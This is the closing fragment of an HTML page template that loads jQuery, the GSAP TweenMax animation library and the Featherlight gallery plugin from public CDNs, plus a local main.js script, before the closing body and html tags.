<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->

<script src="/js/main.js"></script>


<!-- Disqus Comments -->



</body>

</html>